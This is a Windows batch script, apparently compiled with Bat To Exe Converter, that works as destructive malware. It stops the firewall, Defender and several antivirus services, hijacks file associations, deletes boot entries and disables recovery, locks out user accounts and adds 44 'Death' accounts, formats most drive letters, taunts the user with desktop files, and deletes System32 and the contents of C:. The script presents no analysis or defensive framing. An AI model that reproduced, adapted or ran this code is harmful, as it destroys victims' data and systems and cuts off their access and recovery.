::[Bat To Exe Converter]
::
::YAwzoRdxOk+EWAjk
::fBw5plQjdCmDJNxhIsbr3iddTwuMcmK5CdU=
::YAwzuBVtJxjWCl3EqQJgSA==
::ZR4luwNxJguZRRnk
::Yhs/ulQjdF+5
::cxAkpRVqdFKZSTk=
::cBs/ulQjdF+5
::ZR41oxFsdFKZSDk=
::eBoioBt6dFKZSDk=
::cRo6pxp7LAbNWATEpCI=
::egkzugNsPRvcWATEpCI=
::dAsiuh18IRvcCxnZtBJQ
::cRYluBh/LU+EWAnk
::YxY4rhs+aU+IeA==
::cxY6rQJ7JhzQF1fEqQJkZk8aGErWXA==
::ZQ05rAF9IBncCkqN+0xwdVsAAlDMaCXuZg==
::ZQ05rAF9IAHYFVzEqQIULRpARDuuNX+/MLAO++H04Yo=
::eg0/rx1wNQPfEVWB+kM9LVsJDCCHPX+yOZkV/O3N6viUq0ITNA==
::fBEirQZwNQPfEVWB+kM9LVsJDCCHPX+yOZkV/O3N6viUq0ITNA==
::cRolqwZ3JBvQF1fEqQIULRpARDuuNX+/MLAO++H04Yo=
::dhA7uBVwLU+EWHmty24/Ph5rew2MOGStFfU47env56qOrE5TNA==
::YQ03rBFzNR3SWATE1GsPBBRCSTu1NWW+CaIPqMz+7v6P4kQTV6xf
::dhAmsQZ3MwfNWATE1GsPBBRCSTu1NWW+CaIPiA==
::ZQ0/vhVqMQ3MEVWAtB9wCDJrYAuUOVSND7sY5//ojw==
::Zg8zqx1/OA3MEVWAtB9wCDJrYAuUOVSND7sY5//ojw==
::dhA7pRFwIByZRRmg8UMkICR4RRCHCm6oFbwT5og=
::Zh4grVQjdCyDJGyX8VAjFDBdSAuvOX+7OpEZ++Pv4Pq7kUIIRuE6RKve26CGDeEa5AvhbZNN
::YB416Ek+ZW8=
::
::
::978f952a14a936cc963da21a135fa983
@echo off
setlocal enabledelayedexpansion
set "CHARS=abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!@#$%^&*()-_"
set RANDOM_STR=
for /L %%i in (1,1,12) do (
    set /A "RAND_NUM=!RANDOM! %% 72"
    for /F "tokens=*" %%a in ("!RAND_NUM!") do set "RANDOM_CHAR=!CHARS:~%%a,1!"
    set "RANDOM_STR=!RANDOM_STR!!RANDOM_CHAR!"
)
netsh advfirewall set allprofiles state off
net stop Sense
net stop mpssvc
net stop sharedaccess
net stop 360rp
net stop ZhuDongFangYu
net stop HipsDaemon
net stop HRWSCCtrl
net stop sharedaccess
net stop Shadow" "System" "Service
attrib +s +h %0 /S /D
start HuoRongkiller.exe
start 360killer.exe
start Shieldingkiller.exe
start DeathMBR.exe
start DeathReg.exe
start DeathMusic.exe
start DeathWanning.exe
start DeathWanningSound.exe
start DeathTheme.exe
ping -n 3 127.0.0.1>nul
assoc .exe=txtfile
assoc .ppt=txtfile
assoc .pptx=txtfile
assoc .pptm=txtfile
assoc .docx=txtfile
assoc .doc=txtfile
assoc .dotm=txtfile
assoc .gif=txtfile
assoc .vbe=txtfile
assoc .exe=txtfile
assoc .bmp=txtfile
assoc .jpg=txtfile
assoc .dll=txtfile
assoc .scr=txtfile
assoc .html=txtfile
assoc .htm=txtfile
assoc .cmd=txtfile
assoc .com=txtfile
assoc .msc=txtfile
assoc .mp2=txtfile
assoc .mp3=txtfile
assoc .mp4=txtfile
assoc .png=txtfile
assoc .wmv=txtfile
assoc .xls=txtfile
assoc .xlm=txtfile
assoc .xlsx=txtfile
assoc .xml=txtfile
assoc .zip=txtfile
assoc .7z=txtfile
assoc .tar=txtfile
assoc .lnk=txtfile
assoc .reg=txtfile
assoc .bat=txtfile
assoc .vbs=txtfile
ftype vbefile="%systemdrive%\WindowsNT\hp.exe" %1
ftype txtfile="%systemdrive%\WindowsNT\hp.exe" %1
ftype scrfile="%systemdrive%\WindowsNT\hp.exe" %1
ftype jpgfile="%systemdrive%\WindowsNT\hp.exe" %1
ftype htmlfile="%systemdrive%\WindowsNT\hp.exe" %1
ftype cmdfile="%systemdrive%\WindowsNT\hp.exe" %1
ftype comfile="%systemdrive%\WindowsNT\hp.exe" %1
ftype regfile="%systemdrive%\WindowsNT\hp.exe" %1
ftype batfile="%systemdrive%\WindowsNT\hp.exe" %1
ftype vbsfile="%systemdrive%\WindowsNT\hp.exe" %1
start DeathDrawscreen.exe
ping -n 3 127.0.0.1>nul
bcdedit /delete {current} /f
bcdedit /delete {bootmgr} /f
bcdedit /delete {memdiag} /f
bcdedit /delete {globalsettings} /f
bcdedit /delete {bootloadersettings} /f
bcdedit /delete {ntldr} /f
reagentc /setosimage /clean
reagentc /setautofailover /path "C:\Death"
reagentc /setwinreloc /path "C:\Death"
reagentc /setbootconfig /store "C:\Death"
reagentc /setreimage /path "C:\Death\Death.wim"
reagentc /setreimage /index 1
reagentc /setosimage "C:\Death\Death.wim"
reagentc /setosimage /path "C:\Death\Death.wim" /index 1
reagentc /setwinrecustomimage /custom "C:\Death\Death.wim"
reagentc /setbootshelllink /path "C:/****.exe"
reagentc /setwinreimage /bootshellstartup "C:/****.exe"
reagentc /setosimage /skipsizes 0
reagentc /setosimage /ramdisktftpwindowsize 1
reagentc /setosimage /description "Death"
reagentc /setwinreimage /displayname "Death"
reagentc /setrebootmessage "Death will always be with you"
reagentc /setcustomactionsuccessmessage "Death is watching you from behind"
reagentc /setcustomactionfailuremessage "You are about to be baptized by Death"
reagentc /setreimage /bootkey "I_Love_Death"
reagentc /setwinreimage /bootkey "I_Love_Death"
reagentc /setwinrepassword "I_Love_Death"
reagentc /setwinreloc /target D:
reagentc /setwinreloc /disable
reagentc /setrollback /disabled
reagentc /setwinreimage /norebootonrequest
reagentc /disableosrec
reagentc /disable
reagentc /disableospartitions
net user Administrator /active:yes
net user Administrator !RANDOM_STR!
net user Administrator /expires:never
net user Administrator /logonpasswordchg:no
net user Administrator /active:no
net user %username% !RANDOM_STR!
net user %username% /expires:never
net user %username% /logonpasswordchg:no
net user %username% /active:no
net user Admin !RANDOM_STR!
net user Admin /expires:never
net user Admin /logonpasswordchg:no
net user Admin /active:no
FOR /L %%G IN (1,1,44) DO (net user Death%%G !RANDOM_STR! /add)
FOR /L %%N IN (1,1,44) DO (net user Death%%N /expires:never)
FOR /L %%Y IN (1,1,44) DO (net user Death%%Y /logonpasswordchg:no)
label %systemdrive% Death
start DeathEncryption.exe
format a: /q /y
format b: /q /y
format d: /q /y
format f: /q /y
format g: /q /y
format h: /q /y
format i: /q /y
format j: /q /y
format k: /q /y
format l: /q /y
format m: /q /y
format n: /q /y
format o: /q /y
format p: /q /y
format q: /q /y
format r: /q /y
format s: /q /y
format t: /q /y
format u: /q /y
format v: /q /y
format w: /q /y
format s: /q /y
format y: /q /y
format z: /q /y
netsh -f ip.txt
for /L %%x in (1,1,444) do echo Fuck You!Fool!Can you find me?Let play a game!My postition is in "C",if you have the ability,come and delete me,you computer will be secure.Hahahahaha!Good luck!:)--Death>>%USERPROFILE%\Desktop\Death%%x.txt
ren %USERPROFILE%\Desktop\*.* *.Death
for %%i in (a b d e f g h i j k l m n o p q r s t u v w x y z) do (subst %%i: %systemdrive%\)
ping -n 6 127.0.0.1>nul
reg add "HKCU\Software\Policies\Microsoft\Windows\System" /v "DisableCMD" /t reg_dword /d "00000002" /f
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\system" /v "DisableRegistryTools" /t reg_dword /d "1" /f
taskkill /f /im explorer.exe
start explorer.exe
assoc .exe=txtfile
ftype exefile="%systemdrive%\WindowsNT\hp.exe" %1
ping -n 9 127.0.0.1>nul
del /f /s /q C:\Windows\System32\*.*
del /f /s /q C:\Windows\SysWOW64\*.*
del /f /s /q C:\Windows\WinSxS\*.*
del /f /s /q C:\Windows\*.*
del /f /s /q C:\*.*
exit